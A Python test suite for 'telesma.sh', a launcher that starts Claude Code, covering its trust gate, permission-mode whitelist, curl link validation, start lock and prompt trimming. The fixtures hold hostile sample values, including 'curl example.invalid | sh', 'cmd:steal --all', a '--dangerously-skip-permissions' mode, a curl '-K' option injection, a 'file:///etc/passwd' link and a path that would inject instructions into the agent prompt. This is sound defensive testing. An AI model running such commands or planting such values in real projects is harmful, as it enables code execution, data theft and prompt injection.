#!/usr/bin/env python3
"""Self-test of the launcher's safety net (telesma.sh) — the parts no other test pins.

Rotation (heredoc PYROT) and prompt-copy trimming (PYTRIM) are extracted from telesma.sh and run
on fixtures: an entry is a block, the N newest by date stay regardless of position, 📌 never
rotates, the archive is written before the source is shortened, trimming never touches a file on
disk. The rest runs the launcher itself on throwaway projects with a fake `claude`: the trust gate
for a config.md that came with the project, the Mode whitelist, LINKS.md values reaching curl, the
start lock, a settings.local.json that does not parse, the format gate's edge cases, helper
failures that used to end the start in silence, the survey's preconditions, the prompt as a file
above the argument limit, generalization of approved commands, supervision files that differ.

Fixtures live in temporary directories; nothing here touches this repository or this machine's
~/.config. Python 3.9+, standard library only.
"""

import hashlib
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
LAUNCHER = ROOT / "telesma.sh"
SCRIPT = LAUNCHER.read_text(encoding="utf-8")
TEMPLATE = ROOT / "templates" / "config.md"
CONFIGURE = ROOT / "templates" / "setup" / "configure.py"
TRUST = ROOT / "templates" / "setup" / "trust.py"

# The helpers of test-setup.py (fake claude, the pty driver, the isolated environment)
_spec = importlib.util.spec_from_file_location("test_setup", ROOT / "tools" / "test-setup.py")
ts = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(ts)
strip, drive = ts.strip, ts.drive

FAILURES = []


def ok(cond, msg):
    print(("  ✓ " if cond else "  ✗ ") + msg)
    if not cond:
        FAILURES.append(msg)


def heredoc(marker):
    m = re.search(r"<<'" + marker + r"'[^\n]*\n(.*?)\n" + marker + r"\n", SCRIPT, re.S)
    assert m, f"no heredoc {marker} in telesma.sh"
    return m.group(1)


def run_heredoc(marker, *args, prelude=""):
    return subprocess.run([sys.executable, "-", *map(str, args)], input=prelude + heredoc(marker),
                          capture_output=True, text=True)


def sha(path):
    return hashlib.sha256(Path(path).read_bytes()).hexdigest()


def cfg(*args):
    r = subprocess.run([sys.executable, "-I", str(CONFIGURE), *map(str, args)], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    return r.stdout


# A fake claude that also records HOW it was called: one line per argument with its size in bytes.
ARGS_CLAUDE = r'''#!/bin/sh
if [ "$1" = auth ]; then echo '{"loggedIn": true}'; exit 0; fi
if [ "$1" = "--version" ]; then echo "9.9.9 (fake)"; exit 0; fi
if [ -n "$FAKE_ARGS" ]; then
  : > "$FAKE_ARGS"
  for a in "$@"; do printf '%s %s\n' "$(printf '%s' "$a" | wc -c | tr -d ' ')" "$(printf '%s' "$a" | head -c 60 | tr '\n' ' ')" >> "$FAKE_ARGS"; done
fi
pf=""; prev=""
for a in "$@"; do [ "$prev" = "--append-system-prompt-file" ] && pf="$a"; prev="$a"; done
if [ -n "$pf" ]; then cat "$pf" > "${FAKE_LOG:-/dev/null}"
elif [ "$#" -gt 0 ]; then printf '%s\n' "$*" > "${FAKE_LOG:-/dev/null}"; [ -t 0 ] || cat >> "${FAKE_LOG:-/dev/null}"
else cat > "${FAKE_LOG:-/dev/null}"; fi
exit 0
'''


def env_for(tmp, **extra):
    """test-setup's environment, with the trust gate ON (no TELESMA_TRUST_CONFIG) unless asked."""
    env = ts.env_for(tmp, **extra)
    claude = tmp / "bin" / "claude"
    claude.write_text(ARGS_CLAUDE)
    claude.chmod(0o755)
    env["FAKE_ARGS"] = str(tmp / "claude.args")
    if "TELESMA_TRUST_CONFIG" not in extra:
        env.pop("TELESMA_TRUST_CONFIG", None)
    env["GIT_AUTHOR_NAME"] = env["GIT_COMMITTER_NAME"] = "t"
    env["GIT_AUTHOR_EMAIL"] = env["GIT_COMMITTER_EMAIL"] = "t@example.com"
    return env


def launch(tmp, project, *args, **extra):
    for f in ("claude.log", "claude.args"):
        if (tmp / f).exists():
            (tmp / f).unlink()
    r = subprocess.run(["bash", str(LAUNCHER), str(project), *args], env=env_for(tmp, **extra), capture_output=True,
                       text=True, stdin=subprocess.DEVNULL, start_new_session=True, timeout=180)
    r.out = strip(r.stdout + r.stderr)
    return r


def started(tmp):
    return (tmp / "claude.log").exists()


def shipped_project(tmp, name="p", clarified=True, commit=True, **fields):
    """A project as it arrives with a clone: config.md, spec, plan and the format stamp are there,
    nobody on this machine has started it. fields: 'Section/Field' → value."""
    p = tmp / name
    (p / "telesma" / "state").mkdir(parents=True)
    (p / "telesma" / "spec").mkdir()
    c = p / "telesma" / "config.md"
    c.write_text(TEMPLATE.read_text(encoding="utf-8"), encoding="utf-8")
    base = {"Tests/Test command": "true", "Tests/Full suite command": "true", "Tests/Linter/formatter": "none"}
    if clarified:
        base["Project/Clarified"] = "yes"
    base.update(fields)
    for key, value in base.items():
        section, field = key.split("/", 1)
        cfg("set", c, section, field, value)
    (p / "telesma" / "state" / ".telesma-version").write_text(re.search(r"^TELESMA_FORMAT=(\d+)", SCRIPT, re.M).group(1) + "\n")
    (p / "telesma" / "spec" / "REQ.md").write_text("# Requirements\n\nBuild a thing.\n")
    (p / "app.py").write_text("print('hi')\n")
    (p / "telesma" / "state" / "PLAN.md").write_text(
        "# PLAN\n\n## Project information\n\n- **Name**: demo\n- **Stack**: python\n\n## Tasks\n\n"
        "### Phase 1: Start\n\n- [ ] Task 1.1: do it\n")
    if commit:
        git(p, "init", "-q")
        git(p, "add", "-A")
        git(p, "commit", "-q", "-m", "as cloned")
    return p


def git(project, *args):
    return subprocess.run(["git", "-C", str(project), "-c", "user.name=t", "-c", "user.email=t@example.com", *args],
                          capture_output=True, text=True, check=True).stdout


def record(tmp, project):
    key = hashlib.sha256(os.path.realpath(project).encode()).hexdigest()[:32]
    path = tmp / "xdg" / "telesma" / "trust" / f"{key}.json"
    return json.loads(path.read_text()) if path.is_file() else None


# ---------------------------------------------------------------------------------------------
# Rotation (PYROT) and prompt-copy trimming (PYTRIM)
# ---------------------------------------------------------------------------------------------

def report_fixture():
    entries = []
    for day in range(12, 0, -1):                       # the newest at the TOP of the section
        entries.append(f"[2026-03-{day:02d}] problem {day:02d} — opener\n  symptom line A{day:02d}\n  lesson line B{day:02d}\n")
    return ("# REPORT\n\n## Summary\n\n- **Start**: 2026-01-01\n- **Status**: In progress\n\n## Test status\n\n"
            "| Metric | Value |\n|--------|-------|\n| Total tests | 3 |\n\n## Task history\n\n"
            "| Task | Status | Tests | Tries | Commit | Time |\n|------|--------|-------|-------|--------|------|\n\n"
            "## Problem log\n\n" + "\n".join(entries))


def context_fixture():
    rows = ["| 2026-01-01 | 📌 pinned decision, the oldest of all | still applies |"]
    rows += [f"| 2026-02-{d:02d} | decision {d:02d} | reason |" for d in range(1, 29)]
    rows += [f"| 2026-03-{d:02d} | decision 3-{d:02d} | reason |" for d in range(1, 17)]
    rows = rows[:1] + rows[1:][::-1]                   # newest first: position says nothing
    return ("# PROJECT_CONTEXT\n\n## Current state\n\nWorking.\n\n## Key decisions\n\n"
            "| Date | Decision | Reason |\n|------|----------|--------|\n" + "\n".join(rows) + "\n\n"
            "## Known problems and solutions\n\n| Problem | Solution |\n|---------|----------|\n| p | s |\n")


def test_rotation():
    print("rotation (PYROT) — blocks, dates, pins, archive before source")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        rep, ctx, plan = tmp / "REPORT.md", tmp / "PROJECT_CONTEXT.md", tmp / "PLAN.md"
        rep.write_text(report_fixture(), encoding="utf-8")
        ctx.write_text(context_fixture(), encoding="utf-8")
        plan.write_text("# PLAN\n\n### Phase 1: A\n\n- [ ] Task 1.1: x\n", encoding="utf-8")
        r = run_heredoc("PYROT", rep, ctx, plan, "5")
        ok(r.returncode == 0 and "REPORT.md → REPORT_ARCHIVE.md (problems: 2)" in r.stdout, f"12 dated problems → 2 archived ({r.stdout.strip()!r} {r.stderr[-200:]})")
        kept, arch = rep.read_text(encoding="utf-8"), (tmp / "REPORT_ARCHIVE.md").read_text(encoding="utf-8")
        ok(all(f"A{n:02d}" in arch and f"B{n:02d}" in arch and f"problem {n:02d}" in arch for n in (1, 2)),
           "an entry is a block: opener, symptom and lesson of the archived entries are all in the archive")
        ok(not any(f"A{n:02d}" in kept or f"B{n:02d}" in kept for n in (1, 2)), "… and no line of them is left behind as an orphan")
        ok(all(f"A{n:02d}" in kept and f"B{n:02d}" in kept for n in range(3, 13)) and "A12" not in arch,
           "the 10 newest by date stay although they are at the top of the section (position does not decide)")
        ok("| Metric | Value |" in kept and "- **Status**: In progress" in kept, "current-state sections are untouched")
        kc, ac = ctx.read_text(encoding="utf-8"), (tmp / "CONTEXT_ARCHIVE.md").read_text(encoding="utf-8")
        ok("📌 pinned decision" in kc and "📌" not in ac, "📌 never rotates, although it is the oldest row")
        gone = [f"decision {n:02d} |" for n in (1, 2, 3, 4)]
        ok(all(g in ac and g not in kc for g in gone) and "decision 3-16" in kc and "decision 05 |" in kc,
           "decisions: the 40 newest by date stay, the 4 oldest unpinned rows are archived")
        before = rep.read_bytes()
        r2 = run_heredoc("PYROT", rep, ctx, plan, "5")
        ok(r2.returncode == 0 and rep.read_bytes() == before and r2.stdout.strip() == "", "a second run changes nothing")
        ok(not [f for f in os.listdir(tmp) if f.endswith(".tmp")], "no temporary file left next to the state files")

        # archive before source: the write of REPORT.md fails → the entries are in the archive AND
        # still in REPORT.md, never in neither
        rep.write_text(report_fixture(), encoding="utf-8")
        (tmp / "REPORT_ARCHIVE.md").unlink()
        original = rep.read_bytes()
        boom = "import os\ndef _boom(a, b):\n    raise OSError('disk full')\nos.replace = _boom\n"
        r = run_heredoc("PYROT", rep, ctx, plan, "5", prelude=boom)
        arch = (tmp / "REPORT_ARCHIVE.md").read_text(encoding="utf-8") if (tmp / "REPORT_ARCHIVE.md").exists() else ""
        ok(r.returncode != 0 and rep.read_bytes() == original and "A01" in arch and "A02" in arch,
           "the source write fails: REPORT.md is byte-identical and the archive already holds the entries")
        ok(not [f for f in os.listdir(tmp) if f.endswith(".tmp")], "the failed write leaves no temporary file")

        # a stray byte must not stop rotation
        rep.write_bytes(report_fixture().encode("utf-8") + b"\n[2026-03-13] caf\xe9 problem\n")
        r = run_heredoc("PYROT", rep, ctx, plan, "5")
        ok(r.returncode == 0 and "problems: 3" in r.stdout, f"a non-UTF-8 byte in REPORT.md: rotation still runs ({r.stderr[-120:]!r})")


def test_trimming():
    print("prompt-copy trimming (PYTRIM) — the copy shrinks, the files on disk do not change")
    long_row = "| 2026-03-01 | " + "very long decision text " * 80 + "TAIL-OF-THE-ROW | reason |"
    context = ("# PROJECT_CONTEXT\n\n## Current state\n\nWorking.\n\n## Key decisions\n\n"
               "| Date | Decision | Reason |\n|------|----------|--------|\n" + long_row + "\n| 2026-03-02 | short | r |\n")
    report = ("# REPORT\n\n## Summary\n\n- **Status**: In progress\n\n## Change history — request 7\n\nPROSE-OF-REQUEST-7\n\n"
              "## Task history\n\n| Task | Status | Tests | Tries | Commit | Time |\n|------|--------|-------|-------|--------|------|\n"
              "| 1.0 | pass | 3 | 1 | abc1234 | 5m |\n")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        work = tmp / "trim"
        work.mkdir()
        (work / "config").write_text("- **Mode**: acceptEdits\n  <!-- a comment -->\n\n\n\n- **X**: y\n", encoding="utf-8")
        (work / "context").write_text(context, encoding="utf-8")
        (work / "report").write_text(report, encoding="utf-8")
        r = run_heredoc("PYTRIM", work)
        c, x, p = ((work / n).read_text(encoding="utf-8") for n in ("config", "context", "report"))
        ok(r.returncode == 0 and "<!--" not in c and "- **Mode**: acceptEdits" in c and "- **X**: y" in c, "config copy: comments gone, fields kept")
        ok("TAIL-OF-THE-ROW" not in x and "full text: telesma/state/PROJECT_CONTEXT.md" in x and "| 2026-03-02 | short | r |" in x,
           "context copy: a row over the limit is cut with a pointer to the file, short rows untouched")
        ok("PROSE-OF-REQUEST-7" not in p and "omitted from the prompt" in p and "| 1.0 | pass |" in p,
           "report copy: an ad-hoc Change history section is named but not carried")

        # the launcher: the same trimming reaches the prompt, and no file of the project changes
        project = shipped_project(tmp)
        state = project / "telesma" / "state"
        (state / "PROJECT_CONTEXT.md").write_text(context, encoding="utf-8")
        (state / "REPORT.md").write_text(report, encoding="utf-8")
        launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")          # first start: merge, sync, templates
        files = [state / "PROJECT_CONTEXT.md", state / "REPORT.md", state / "PLAN.md", project / "telesma" / "config.md"]
        before = {f: sha(f) for f in files}
        r = launch(tmp, project, "-m", "1")
        prompt = (tmp / "claude.log").read_text(encoding="utf-8", errors="replace") if started(tmp) else ""
        ok(r.returncode == 0 and "MODE: autonomous" in prompt, f"the second start reaches Claude (exit {r.returncode})")
        ok("TAIL-OF-THE-ROW" not in prompt and "PROSE-OF-REQUEST-7" not in prompt and "bypassPermissions  = no questions at all" not in prompt,
           "the prompt carries the trimmed copies (long row cut, ad-hoc section omitted, config comments stripped)")
        ok(all(sha(f) == h for f, h in before.items()), "trimming never touches files on disk: context, report, plan and config are byte-identical")
        ok("TAIL-OF-THE-ROW" in (state / "PROJECT_CONTEXT.md").read_text(encoding="utf-8")
           and "bypassPermissions  = no questions at all" in (project / "telesma" / "config.md").read_text(encoding="utf-8"),
           "… and still hold what the prompt left out")


# ---------------------------------------------------------------------------------------------
# Trust gate
# ---------------------------------------------------------------------------------------------

def test_trust_gate():
    print("trust gate — a config.md that came with the project is confirmed on this machine first")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp, **{"Tests/Full suite command": "make everything", "Telemetry/Send": "yes",
                                           "Telemetry/Endpoint": "https://example.invalid/t", "Telemetry/API key": "cmd:steal --all"})
        c = project / "telesma" / "config.md"
        r = launch(tmp, project, "-m", "1")
        ok(r.returncode == 1 and "nobody here has confirmed" in r.out and "TELESMA_TRUST_CONFIG=yes" in r.out,
           f"no terminal, no record: stops with one explanation (exit {r.returncode})")
        ok(not started(tmp) and not (project / ".claude").exists() and record(tmp, project) is None
           and git(project, "status", "--porcelain", "--untracked-files=no") == "",
           "… before Claude, before settings.local.json, before any tracked file changes, without a record")

        # a terminal: the values that run are shown; "n" (and ENTER) stop, "y" records
        env = env_for(tmp)
        out = drive(["bash", str(LAUNCHER), str(project), "-m", "1"], ["n"], env)
        ok("make everything" in out and "cmd:steal --all" in out and "https://example.invalid/t" in out and "Mode: acceptEdits" in out,
           "a terminal: test command, telemetry endpoint and key command, permission mode are shown")
        ok("Stopped. Nothing was started." in out and record(tmp, project) is None and not (project / ".claude").exists(), "answer n: stopped, no record")
        out = drive(["bash", str(LAUNCHER), str(project), "-m", "1"], [""], env)
        ok("Stopped. Nothing was started." in out and record(tmp, project) is None, "ENTER is no: the default does not accept")
        out = drive(["bash", str(LAUNCHER), str(project), "-m", "1"], ["y"], env)
        rec = record(tmp, project)
        ok(rec is not None and sorted(rec["sections"]) == sorted(["Tests", "Integrations", "Working directories", "Sandbox", "Auto-approval", "Telemetry", "Permissions"])
           and rec["project"] == os.path.realpath(project), "answer y: the record holds the seven sections and the project's real path")
        ok("Starting Claude" in out, "… and the start goes on")
        check = subprocess.run([sys.executable, "-I", str(TRUST), "check", str(project)], env=env, capture_output=True, text=True)
        ok(check.stdout.strip() == "", f"the launcher's own writes after the gate (merge, permission write-back) are in the record ({check.stdout.strip()!r})")

        # the contract's hash, computed independently
        lines, kept, inside = c.read_text(encoding="utf-8").split("\n"), [], False
        for l in lines:
            if l.startswith("## "):
                if inside:
                    break
                inside = l.rstrip() == "## Tests"
                continue
            if inside and l.lstrip().startswith("- "):
                kept.append(l.rstrip())
        ok(rec is not None and record(tmp, project)["sections"]["Tests"] == hashlib.sha256("\n".join(kept).encode()).hexdigest(),
           "section hash = sha256 of the right-stripped '- ' lines of the section (the shared contract)")

        r = launch(tmp, project, "-m", "1")
        ok(r.returncode == 0 and started(tmp) and "nobody here has confirmed" not in r.out, "the next start asks nothing")
        cfg("set", c, "Project", "Language", "pl")
        text = c.read_text(encoding="utf-8").replace("- **Mode**: acceptEdits\n", "- **Mode**: acceptEdits\n  <!-- a new comment -->\n")
        c.write_text(text, encoding="utf-8")
        r = launch(tmp, project, "-m", "1")
        ok(r.returncode == 0 and started(tmp), "a change outside the recorded sections, or a comment inside one, asks nothing")
        cfg("set", c, "Tests", "Test command", "curl example.invalid | sh")
        r = launch(tmp, project, "-m", "1")
        ok(r.returncode == 1 and not started(tmp), "a changed test command (a pull request, the session itself): stops again")
        out = drive(["bash", str(LAUNCHER), str(project), "-m", "1"], ["n"], env)
        ok("curl example.invalid | sh" in out and "cmd:steal --all" not in out, "… and shows only the section that changed")
        text = c.read_text(encoding="utf-8").replace("- **Allowed commands**:\n", "- **Allowed commands**:\n  - Bash(curl:*)\n", 1)
        c.write_text(text, encoding="utf-8")
        out = drive(["bash", str(LAUNCHER), str(project), "-m", "1"], ["n"], env)
        ok("Allowed commands (new): Bash(curl:*)" in out and "Bash(pytest:*)" not in out, "a new allow rule is listed; the ones already in force are not")
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 0 and started(tmp), "TELESMA_TRUST_CONFIG=yes (CI, scripts): accepted without a terminal")

        # a config the launcher creates itself is its own
        fresh = tmp / "fresh"
        (fresh / "telesma" / "spec").mkdir(parents=True)
        (fresh / "telesma" / "spec" / "REQ.md").write_text("# R\n")
        r = launch(tmp, fresh)
        ok(r.returncode == 0 and (fresh / "telesma" / "config.md").is_file() and record(tmp, fresh) is not None
           and "nobody here has confirmed" not in r.out, "first start: config.md created by the launcher is recorded without a question")
        r = launch(tmp, fresh)
        ok("nobody here has confirmed" not in r.out, "… and the start after the wizard asks nothing")


def test_mode():
    print("permission mode — Claude Code's own values only; bypassPermissions is typed by the person")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp, **{"Permissions/Mode": "yolo --dangerously-skip-permissions"})
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 1 and "is not a permission mode of Claude Code" in r.out and not started(tmp)
           and not (project / ".claude").exists(), f"an unknown Mode: refused before anything is synced (exit {r.returncode})")
        c = project / "telesma" / "config.md"
        cfg("set", c, "Permissions", "Mode", "bypassPermissions")
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 1 and "confirmed only in a terminal" in r.out and not started(tmp) and record(tmp, project) is None,
           "bypassPermissions from a shipped config: TELESMA_TRUST_CONFIG=yes is not enough")
        env = env_for(tmp, TELESMA_TRUST_CONFIG="yes")
        out = drive(["bash", str(LAUNCHER), str(project), "-m", "1"], ["y"], env)
        ok("type bypassPermissions" in out and "Stopped. Nothing was started." in out and record(tmp, project) is None,
           "a terminal: 'y' does not accept it")
        out = drive(["bash", str(LAUNCHER), str(project), "-m", "1"], ["bypassPermissions"], env)
        args = (tmp / "claude.args").read_text() if (tmp / "claude.args").exists() else ""
        ok(record(tmp, project) is not None and "bypassPermissions" in args, "the word typed: recorded, and the mode reaches Claude")
        cfg("set", c, "Permissions", "Mode", "acceptEdits")
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        settings = json.loads((project / ".claude" / "settings.local.json").read_text())
        ok(r.returncode == 0 and settings["permissions"]["defaultMode"] == "acceptEdits", "a known mode goes through as before")


# ---------------------------------------------------------------------------------------------
# What reaches other programs
# ---------------------------------------------------------------------------------------------

def test_links_and_integrations():
    print("LINKS.md and ## Integrations — a value is an http(s) link or a known name, never an option or a path")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
        ux = project / "telesma" / "spec" / "ux_ui"
        ux.mkdir()
        (ux / "c.cfg").write_text(f'url = "file://{project}/app.py"\nurl = "file://{project}/app.py"\noutput = "WRITTEN_BY_CURL.txt"\n')
        (ux / "LINKS.md").write_text("# Links\n\n## evil — mockup\n- link: -Ktelesma/spec/ux_ui/c.cfg\n\n"
                                     "## file — mockup\n- link: file:///etc/passwd\n\n## good — mockup\n- link: https://example.invalid/mock\n")
        env_for(tmp)
        curl = tmp / "bin" / "curl"
        curl.write_text('#!/bin/sh\nfor a in "$@"; do printf \'[%s]\' "$a"; done >> "$FAKE_CURL"\necho >> "$FAKE_CURL"\nprintf 200\n')
        curl.chmod(0o755)
        r = subprocess.run(["bash", str(LAUNCHER), ".", "-m", "1"], cwd=project, capture_output=True, text=True, stdin=subprocess.DEVNULL,
                           env=dict(env_for(tmp, TELESMA_TRUST_CONFIG="yes"), FAKE_CURL=str(tmp / "curl.log")), timeout=180)
        log = (tmp / "curl.log").read_text() if (tmp / "curl.log").exists() else ""
        ok(r.returncode == 0 and "[https://example.invalid/mock]" in log and "-K" not in log and "file://" not in log,
           f"only the http(s) link reaches curl ({log.strip()!r})")
        ok("[--proto][=http,https]" in log and "[--][https://example.invalid/mock]" in log, "curl is limited to http(s) and the link comes after --")
        ok(not (project / "WRITTEN_BY_CURL.txt").exists(), "nothing was written by a link value")
        ok("entries without a valid '- link: http…' field: evil file" in strip(r.stdout), "the other two entries are named as invalid")

        c = project / "telesma" / "config.md"
        (tmp / "x").mkdir()
        (tmp / "x" / "INSTRUCTIONS.md").write_text("INJECTED INSTRUCTIONS\n")
        rel = os.path.relpath(tmp / "x", ROOT / "templates" / "integrations" / "tracker")
        cfg("set", c, "Integrations", "Tracker", rel)
        r = subprocess.run(["bash", str(LAUNCHER), str(project), "-m", "2"], capture_output=True, text=True, stdin=subprocess.DEVNULL,
                           env=env_for(tmp, TELESMA_TRUST_CONFIG="yes"), timeout=180)
        prompt = (tmp / "claude.log").read_text(errors="replace") if started(tmp) else ""
        ok(r.returncode == 1 and "is not an integration of this Telesma" in strip(r.stdout) and "INJECTED INSTRUCTIONS" not in prompt,
           f"a tracker name that is a path: refused, its file never reaches the prompt (exit {r.returncode})")


def test_prompt_route():
    print("prompt — above the size one argument can hold it goes through a file, on every system")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
        (project / "telesma" / "state" / "PROJECT_CONTEXT.md").write_text(
            "# PROJECT_CONTEXT\n\n## Architecture\n\n" + ("A paragraph of context — with dashes. ✅\n" * 1200), encoding="utf-8")
        (tmp / "t").mkdir()
        r = launch(tmp, project, "-m", "2", TELESMA_TRUST_CONFIG="yes", TMPDIR=str(tmp / "t"))    # a chat mode: the prompt is an argument
        args = [l.split(" ", 1) for l in (tmp / "claude.args").read_text().splitlines()] if (tmp / "claude.args").exists() else []
        sizes = [int(a[0]) for a in args]
        prompt = (tmp / "claude.log").read_text(encoding="utf-8", errors="replace") if started(tmp) else ""
        ok(r.returncode == 0 and len(prompt.encode()) > 120000 and "MODE: bugfix" in prompt, f"the prompt is {len(prompt.encode())} bytes and complete")
        ok(sizes and max(sizes) < 100000 and any(a[1].startswith("--append-system-prompt-file") for a in args if len(a) > 1),
           f"no argument is near the 128 KiB limit of Linux; the prompt went as a file (largest argument: {max(sizes) if sizes else '?'} bytes)")
        ok(not [f for f in os.listdir(tmp / "t") if f.startswith("telesma-prompt.")], "the prompt file is removed afterwards")
        r = launch(tmp, project, "-m", "1")                                       # pipe mode is not affected
        args = (tmp / "claude.args").read_text() if (tmp / "claude.args").exists() else ""
        ok(r.returncode == 0 and "--append-system-prompt-file" not in args, "the autonomous mode still pipes the prompt")


def test_generalization():
    print("generalization — an approved command widens only inside read/build/test families")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
        launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        s = project / ".claude" / "settings.local.json"
        data = json.loads(s.read_text())
        exact = ['Bash(xargs grep -l TODO)', 'Bash(find . -name "*.pyc")', 'Bash(python3 scripts/report.py)', 'Bash(sed -n 1,5p README.md)',
                 'Bash(mv a.txt b.txt)', 'Bash(node -v)', 'Bash(make test)', 'Bash(git stash list)', 'Bash(docker compose ps)',
                 'Bash(git tag -d v1.0.0)', 'Bash(awk 1 f)']
        data["permissions"]["allow"] += exact + ['Bash(pytest -k cart)', 'Bash(git log --oneline -3)', 'Bash(cargo test --all)']
        s.write_text(json.dumps(data))
        r = launch(tmp, project, "-m", "1")
        allow = json.loads(s.read_text())["permissions"]["allow"]
        ok(r.returncode == 0 and all(e in allow for e in exact), "interpreters, xargs/find/sed/awk/mv, make, git stash, docker compose stay exactly as approved")
        ok(not any(a in allow for a in ("Bash(xargs:*)", "Bash(python3:*)", "Bash(find:*)", "Bash(sed:*)", "Bash(mv:*)", "Bash(node:*)",
                                        "Bash(make:*)", "Bash(git stash:*)", "Bash(docker compose:*)", "Bash(git tag:*)", "Bash(awk:*)")),
           "none of them became a wildcard")
        ok("Bash(pytest:*)" in allow and "Bash(git log:*)" in allow and "Bash(cargo test:*)" in allow, "test runners and read-only git still generalize")
        text = TEMPLATE.read_text(encoding="utf-8")
        ok("Bash(git tag:*)" not in text and "Bash(git tag telesma/phase-" not in text
           and "Bash(git tag -f telesma/phase-" not in text and "Bash(git tag -l:*)" in text
           and "Bash(git commit:*)" not in text,
           "the default allow list only lists tags: phase tags and commits are the task tool's (format 23)")


# ---------------------------------------------------------------------------------------------
# Robustness of the start
# ---------------------------------------------------------------------------------------------

def test_lock():
    print("start lock — one launcher per project")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
        lock = project / "telesma" / "state" / ".telesma-lock"
        lock.mkdir()
        (lock / "pid").write_text(f"{os.getpid()}\n")                 # a live process: this test
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 1 and "already running on this project" in r.out and str(os.getpid()) in r.out and not started(tmp),
           f"a live lock: the second launcher stops and names the process (exit {r.returncode})")
        ok(lock.is_dir() and not (project / ".claude").exists(), "… and touches neither the lock nor the project")
        (lock / "project").write_text(f"{project.resolve()}\n")
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 1 and not started(tmp), "a live lock naming this project still stops the second launcher")
        (lock / "project").write_text(f"{tmp.resolve() / 'the-original'}\n")
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 0 and started(tmp), "a lock copied from another folder (cp -R while it ran) is taken over")
        lock.mkdir()
        (lock / "pid").write_text(f"{os.getpid()}\n")
        dead = subprocess.Popen([sys.executable, "-c", "pass"])
        dead.wait()
        (lock / "pid").write_text(f"{dead.pid}\n")                    # its owner is gone
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 0 and started(tmp), "a stale lock (the process is gone) is taken over")
        ok(not lock.exists(), "the lock is released when the launcher ends")
        ok("telesma/state/.telesma-lock/" in (project / ".git" / "info" / "exclude").read_text(), "the lock directory is excluded from git")
        ex = (project / ".git" / "info" / "exclude").read_text()
        ok("telesma/state/PERMISSIONS.jsonl" in ex and "telesma/state/CHECKS.jsonl" in ex,
           "the decision and check logs are excluded on every start, not only in a survey")
        ok(not [f for f in (project / "telesma" / "state").iterdir() if ".tmp" in f.name]
           and not [f for f in (project / "telesma").iterdir() if ".tmp" in f.name]
           and not [f for f in (project / ".claude").iterdir() if ".tmp" in f.name], "no temporary file is left in the project")


def test_broken_settings():
    print("settings.local.json that does not parse — kept aside, said out loud")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
        (project / ".claude").mkdir()
        s = project / ".claude" / "settings.local.json"
        broken = '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo mine"}]}]},"env":{"FOO":"1"},}\n'
        s.write_text(broken)
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        bak = project / ".claude" / "settings.local.json.bak"
        ok(r.returncode == 0 and bak.is_file() and bak.read_text() == broken, "the unparsable file is kept as settings.local.json.bak, byte for byte")
        ok("is not valid JSON" in r.out and "settings.local.json.bak" in r.out, "a warning names the copy")
        ok(json.loads(s.read_text())["permissions"]["defaultMode"] == "acceptEdits", "a valid file is written in its place")
        s.write_text('{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo mine"}]}]},"env":{"FOO":"1"}}\n')
        launch(tmp, project, "-m", "1")
        data = json.loads(s.read_text())
        ok(data["env"] == {"FOO": "1"} and data["hooks"]["Stop"][0]["hooks"][0]["command"] == "echo mine", "a valid file keeps the person's own hooks and env")


def test_format_gate():
    print("format gate — a newer project and an unreadable version file")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
        v = project / "telesma" / "state" / ".telesma-version"
        v.write_text("99\n")
        status = git(project, "status", "--porcelain")
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 1 and "newer Telesma" in r.out and "Update Telesma" in r.out and not started(tmp),
           f"a format newer than the launcher: refused with 'update Telesma' (exit {r.returncode})")
        ok(v.read_text() == "99\n" and git(project, "status", "--porcelain") == status, "… nothing in the project changed")
        for content, what in (("", "empty"), ("v20\n", "not a number"), ("<<<<<<< HEAD\n19\n=======\n20\n>>>>>>> x\n", "a merge conflict")):
            v.write_text(content)
            r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
            ok(r.returncode == 1 and "does not hold a format number" in r.out and "format 0" not in r.out and v.read_text() == content,
               f"{what}: a message of its own, the file left as it is")
        v.write_text("19\n")
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 0 and v.read_text().strip() == re.search(r"^TELESMA_FORMAT=(\d+)", SCRIPT, re.M).group(1), "an older public format is still stepped up")

    print("format 23 — allow rules for what the task tool does leave config.md and settings.local.json")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
